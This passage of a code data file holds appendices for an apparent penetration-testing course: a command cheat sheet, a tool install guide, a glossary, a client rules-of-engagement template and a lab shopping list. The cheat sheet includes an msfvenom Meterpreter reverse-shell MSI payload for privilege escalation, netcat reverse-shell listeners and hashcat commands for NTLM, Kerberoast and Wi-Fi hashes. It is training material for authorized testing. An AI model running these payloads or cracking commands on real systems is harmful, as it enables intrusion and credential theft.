          { syntax: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f msi -o payload.msi", description: "Windows MSI installer for AlwaysInstallElevated privilege escalation" }
        ]
      },
      {
        category: "Netcat & Reverse Shell Catchers",
        commands: [
          { syntax: "nc -lvnp 4444", description: "Listen on port 4444 with verbose output and numeric IPs only" },
          { syntax: "rlwrap nc -lvnp 4444", description: "Wrap Netcat listener with readline for arrow keys and history support" },
          { syntax: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", description: "Upgrade dumb Netcat shell to interactive PTY" }
        ]
      },
      {
        category: "Hashcat Cracking Modes",
        commands: [
          { syntax: "hashcat -m 0 -a 0 hashes.txt rockyou.txt", description: "Mode 0: MD5 hash cracking" },
          { syntax: "hashcat -m 1000 -a 0 hashes.txt rockyou.txt", description: "Mode 1000: Windows NTLM hash cracking" },
          { syntax: "hashcat -m 1800 -a 0 hashes.txt rockyou.txt", description: "Mode 1800: Linux SHA-512 ($6$) crypt hashes" },
          { syntax: "hashcat -m 13100 -a 0 hashes.txt rockyou.txt", description: "Mode 13100: Active Directory Kerberoast TGS-REP hashes" },
          { syntax: "hashcat -m 22000 -a 0 hashes.txt rockyou.txt", description: "Mode 22000: WPA/WPA2/WPA3 Wi-Fi PMKID and EAPOL handshakes" }
        ]
      }
    ]
  },
  {
    id: "app-b",
    letter: "B",
    title: "Complete Tool Index & Installation Guide",
    description: "Every tool mentioned across all 24 chapters with exact apt, git, and pip install syntax for Kali & Parrot OS.",
    content: `### Pre-installed vs Essential Manual Installs
Kali Linux comes pre-packaged with 600+ tools, but several modern utilities must be installed manually for peak efficiency.

#### 1. Core Package Manager Installs:
\`\`\`bash
sudo apt update && sudo apt install -y \\
  seclists \\
  feroxbuster \\
  ffuf \\
  chisel \\
  bloodhound \\
  neo4j \\
  responder \\
  gophish \\
  jadx \\
  bettercap \\
  scapy \\
  tshark \\
  fping \\
  tmux \\
  rlwrap
\`\`\`

#### 2. Python Offensive Tooling (pipx recommended):
\`\`\`bash
# Install Impacket suite
pipx install impacket

# Install NetExec (Modern CrackMapExec replacement)
pipx install git+https://github.com/Pennyw0rth/NetExec

# Install BloodHound Python Ingestor
pipx install bloodhound
\`\`\`

#### 3. Go-Based Web & OSINT Tools (ProjectDiscovery):
\`\`\`bash
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
\`\`\``
  },
  {
    id: "app-c",
    letter: "C",
    title: "Offensive Security Glossary & Acronyms",
    description: "Every acronym demystified from AMSI to ZTS.",
    content: `### Essential Terminology Reference
- **AMSI (Antimalware Scan Interface)**: Microsoft Windows API allowing security software to inspect script execution in memory.
- **BSSID (Basic Service Set Identifier)**: The MAC address of a wireless access point.
- **C2 (Command and Control)**: Infrastructure used by attackers to maintain communication with compromised systems (e.g. Cobalt Strike, Sliver, Mythic).
- **CFAA (Computer Fraud and Abuse Act)**: United States federal cybersecurity law making unauthorized access a federal crime.
- **CVSS (Common Vulnerability Scoring System)**: Open standard for assessing the severity of computer system security vulnerabilities.
- **CVE (Common Vulnerabilities and Exposures)**: Unique catalog identifier assigned to known vulnerabilities (e.g., CVE-2021-44228).
- **DAI (Dynamic ARP Inspection)**: Switch security feature that intercepts and validates ARP packets on a VLAN.
- **EAPOL (Extensible Authentication Protocol over LAN)**: Network authentication protocol used in WPA/WPA2 Wi-Fi handshakes.
- **IDOR (Insecure Direct Object Reference)**: Web vulnerability where an application uses user-supplied input to access objects directly without authorization checks.
- **LSASS (Local Security Authority Subsystem Service)**: Windows process responsible for enforcing security policy and storing authentication secrets.
- **MITM (Man-in-the-Middle)**: Attack where communication between two parties is secretly intercepted and potentially modified by an attacker.
- **NSE (Nmap Scripting Engine)**: Embedded Lua scripting environment allowing users to automate wide network discovery and vulnerability exploitation checks.
- **OSINT (Open Source Intelligence)**: Gathering intelligence from publicly available data sources.
- **PTY (Pseudoterminal)**: Software interface that emulates a real hardware terminal, essential for upgrading basic reverse shells.
- **ROE (Rules of Engagement)**: Contractual document governing penetration testing boundaries, timelines, and restrictions.
- **SPN (Service Principal Name)**: Unique identifier for a service instance used in Active Directory Kerberos authentication.
- **SSRF (Server-Side Request Forgery)**: Vulnerability that induces a server-side application to make requests to unintended locations (e.g. cloud metadata services).
- **SUID (Set User ID)**: Linux file permission bit that executes an application with the permissions of the file owner (usually root).`
  },
  {
    id: "app-d",
    letter: "D",
    title: "Legal Penetration Testing Engagement Letter & ROE Template",
    description: "Ready-to-use, professional Rules of Engagement (ROE) and Scope Authorization document for freelance clients.",
    content: `### 📄 Chrishem's Production-Ready Pentest Agreement
*Copy and customize this document when onboarding freelance clients or presenting enterprise proposals.*

---

**STATEMENT OF WORK & RULES OF ENGAGEMENT (ROE)**  
**CONFIDENTIAL DOCUMENT**

**Between:**  
**Lead Security Assessor:** [Your Name / Chrishem Cyber Services]  
**Client Organization:** [Client Enterprise Name, Inc.]  
**Effective Testing Window:** [Start Date] 00:00:00 to [End Date] 23:59:59  

---

#### 1. Explicit Authorization & Grant of Permission
Client hereby explicitly grants Assessor authorization to conduct simulated cyber attacks, penetration testing, and security evaluations against the assets specifically identified in Section 2 (In-Scope Assets). Testing shall be performed strictly within the agreed dates and parameters.

#### 2. Scope Definition
- **In-Scope Targets:**
  - Web Application: \`https://app.clientdomain.com\`
  - API Gateway: \`https://api.clientdomain.com/v1/\`
  - External IP Block: \`203.0.113.0/28\` (Hosts 203.0.113.1 through 203.0.113.14)
- **Strictly Out-of-Scope Assets:**
  - Third-party payment processor (\`https://checkout.stripe.com\`)
  - Corporate email cloud hosting (Google Workspace / Office 365)
  - Physical facility break-in or social engineering of non-technical staff
  - Denial of Service (DoS / DDoS) testing or volume flood attacks

#### 3. Rules of Engagement & Testing Hours
- Testing Window: Permitted Monday through Friday between 18:00 and 06:00 (Off-Peak Hours).
- Attacker Origin IPs: All testing traffic shall originate strictly from Assessor's verified static IP: \`198.51.100.42\`.
- Rate Limiting: Automated scanning tools (Nmap, Gobuster, ffuf) shall be throttled to a maximum of 50 requests per second.

#### 4. Incident Escalation & Emergency Contacts
In the event that Assessor discovers a **Critical Vulnerability** (e.g., active unauthenticated Remote Code Execution or exposed database passwords), testing shall be paused on that specific vector, and emergency contact shall be notified within **two (2) hours**:
- Client Technical Contact: [CISO Name], Phone: [+1-555-0199], Email: [ciso@clientdomain.com]
- Assessor Lead: [Chrishem / Assessor], Phone: [+1-555-0144], Email: [audit@chrishemsecurity.com]

#### 5. Data Handling & Confidentiality
All customer data, network diagrams, vulnerability proofs, and findings shall be encrypted at rest using AES-256 and stored on encrypted media. All client artifacts shall be permanently purged within thirty (30) days following final report sign-off.

---

**SIGNED AND AUTHORIZED BY:**  

For Client Organization:  
Signature: __________________________  
Name: [Authorized Officer]  
Title: Chief Information Security Officer  
Date: __________________________  

For Security Assessor:  
Signature: __________________________  
Name: Chrishem  
Title: Lead Penetration Testing Consultant  
Date: __________________________`
  },
  {
    id: "app-e",
    letter: "E",
    title: "Practice Lab & Hardware Shopping List",
    description: "Curated hardware, Wi-Fi adapters, and free virtualization downloads for the ultimate home lab.",
    content: `### 🛒 The Ultimate Pentester Hardware & Virtualization Kit

#### 1. Hardware Essentials:
- **Recommended Laptop**: Lenovo ThinkPad T14 / P14s (AMD Ryzen 7, 32GB RAM) or Apple MacBook Pro M2/M3 (16GB+ RAM).
- **USB Wi-Fi Penetration Testing Adapter**:
  - **Alfa AWUS036ACH**: Dual-band AC1200 with Realtek RTL8812AU chipset (Supports Monitor Mode & Packet Injection).
  - **Panda PAU09**: Plug-and-play on Linux without compiling out-of-tree drivers.
- **Portable Hardware Toolkit (Optional Pro Toys)**:
  - **Flipper Zero**: Multi-tool for sub-GHz radio, RFID, NFC, infrared, and BadUSB emulation.
  - **Hak5 WiFi Pineapple Mark VII**: Rogue AP and wireless auditing hardware.
  - **Rubber Ducky / Raspberry Pi Zero 2W**: Keystroke injection (HID attacks).

#### 2. Free Virtualization & Lab Downloads:
- **Hypervisors**:
  - [VirtualBox (Windows, Mac, Linux)](https://www.virtualbox.org/) - 100% Free Open Source
  - [VMware Workstation Pro](https://www.vmware.com/) - Free for personal non-commercial use
  - [UTM for macOS Apple Silicon](https://mac.getutm.app/)
- **Vulnerable Targets (Free ISOs)**:
  - [Metasploitable 2 (SourceForge)](https://sourceforge.net/projects/metasploitable/)
  - [Metasploitable 3 (GitHub / Vagrant)](https://github.com/rapid7/metasploitable3)
  - [OWASP Juice Shop (Modern Node.js Web Vulns)](https://owasp.org/www-project-juice-shop/)
  - [DVWA (Damn Vulnerable Web App)](https://github.com/digininja/DVWA)`
  }
];
